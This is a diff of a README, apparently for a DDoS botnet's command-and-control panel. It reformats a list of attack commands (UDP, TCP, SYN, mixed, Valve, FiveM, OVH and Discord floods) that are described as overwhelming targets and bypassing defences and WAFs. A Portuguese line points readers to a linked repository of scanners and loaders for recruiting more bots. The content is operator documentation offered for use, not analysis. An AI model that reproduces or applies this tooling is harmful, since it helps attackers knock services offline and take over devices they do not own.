@@ -28,20 +28,18 @@
   stop  | Stop all your floods in progress
   clear, cls | Clears the console window screen
   exit, logout | Disconnects from the C&C server
-
-  ### Attack Commands
-  Command  | Usage | Description
-  ---------|-------|-------------
-  .UDP     | \<target> \<port> \<time> | Sends UDP packets of varying sizes to overwhelm the target
-  .TCP     | \<target> \<port> \<time> | Continuously sends TCP packets to exhaust the target's connections
-  .SYN     | \<target> \<port> \<time> | Sends SYN requests to exhaust pending TCP connections
-  .MIX     | \<target> \<port> \<time> | Alternates between TCP and UDP to bypass defenses
-  .VSE     | \<target> \<port> \<time> | Send Valve Source Engine Protocol
-  .FIVEM   | \<target> \<port> \<time> | Sends a specialized Payload designed to Fivem
-  .OVHTCP  | \<target> \<port> \<time> | Floods the target port with UDP datagrams containing random payloads
-  .OVHUDP  | \<target> \<port> \<time> | Randomizes bytes (0x00 to 0xFF) and line terminators to bypass WAFs
-  .DISCORD | \<target> \<port> \<time> | Sends a specialized UDP packet designed to Discord
 </div>
+
+
+- .UDP      Sends UDP packets of varying sizes to overwhelm the target
+- .TCP      Continuously sends TCP packets to exhaust the target's connections
+- .SYN      Sends SYN requests to exhaust pending TCP connections
+- .MIX      Alternates between TCP and UDP to bypass defenses
+- .VSE      Send Valve Source Engine Protocol
+- .FIVEM    Sends a specialized Payload designed to Fivem
+- .OVHTCP   Floods the target port with UDP datagrams containing random payloads
+- .OVHUDP   Randomizes bytes (0x00 to 0xFF) and line terminators to bypass WAFs
+- .DISCORD  Sends a specialized UDP packet designed to Discord
 
 > Tente usar <a href="https://github.com/CirqueiraDev/botnet-exploits">Scanners e Loaders</a> para carregar mais bots.
 
